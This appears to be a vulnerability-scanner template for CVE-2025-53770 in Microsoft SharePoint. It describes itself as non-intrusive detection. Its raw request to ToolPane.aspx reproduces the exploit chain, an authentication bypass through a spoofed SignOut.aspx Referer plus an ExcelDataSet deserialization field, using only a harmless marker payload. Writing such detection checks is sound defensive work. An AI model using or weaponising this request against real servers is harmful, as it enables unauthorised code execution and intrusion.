id: CVE-2025-53770

info:
  name: Microsoft SharePoint Server - Remote Code Execution (ToolShell) - CVE-2025-53770
  author: BIZZYLABS.IO
  severity: critical
  description: Non-intrusive detection of CVE-2025-53770 via ToolPane.aspx

variables:
  PAYLOAD: '<diffgr:diffgram xmlns:msdata="urn:schemas-microsoft-com:xml-msdata" xmlns:diffgr="urn:schemas-microsoft-com:xml-diffgram-v1">
  <l1>
    <l2 diffgr:id="Table" msdata:rowOrder="0" diffgr:hasChanges="inserted">
      <l3 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
        <TestData>
          <Info>CVE-2025-53770 - SafeCheck AXcDm - CVE-2025-53770</Info>
          <Timestamp>{{date_time("%Y-%M-%D %H:%m")}}/Timestamp>
        </TestData>
      </l3>
    </l2>
  </l1>
</diffgr:diffgram>'


http:
  - raw:
      - |
        POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx HTTP/1.1
        Host: {{Hostname}}
        Referer: /_layouts/SignOut.aspx
        Content-Type: application/x-www-form-urlencoded

        MSOTlPn_Uri={{Scheme}}%3a//{{Hostname}}/_controltemplates/15/AclEditor.ascx&MSOTlPn_DWP=%3c%25%40%20Register%20Tagprefix%3d%22gizpnozlcjfutvbn%22%20Namespace%3d%22System.Web.UI%22%20Assembly%3d%22System.Web.Extensions%2c%20Version%3d4.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d31bf3856ad364e35%22%20%25%3e%0a%3c%25%40%20Register%20Tagprefix%3d%22sjqjboucouuj%22%20Namespace%3d%22Microsoft.PerformancePoint.Scorecards%22%20Assembly%3d%22Microsoft.PerformancePoint.Scorecards.Client%2c%20Version%3d16.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3d71e9bce111e9429c%22%20%25%3e%0a%20%20%3cgizpnozlcjfutvbn%3aUpdateProgress%3e%0a%20%20%20%20%3cProgressTemplate%3e%0a%20%20%20%20%20%20%3csjqjboucouuj%3aExcelDataSet%20CompressedDataTable%3d%22{{base64(gzip(PAYLOAD))}}%22%20DataTable-CaseSensitive%3d%22true%22%20runat%3d%22server%22/%3e%0a%20%20%20%20%3c/ProgressTemplate%3e%0a%20%20%3c/gizpnozlcjfutvbn%3aUpdateProgress%3e%0a

    matchers:
      - type: dsl
        dsl:
          - 'contains(body,"CVE-2025-53770 - SafeCheck AXcDm - CVE-2025-53770")'
        condition: and


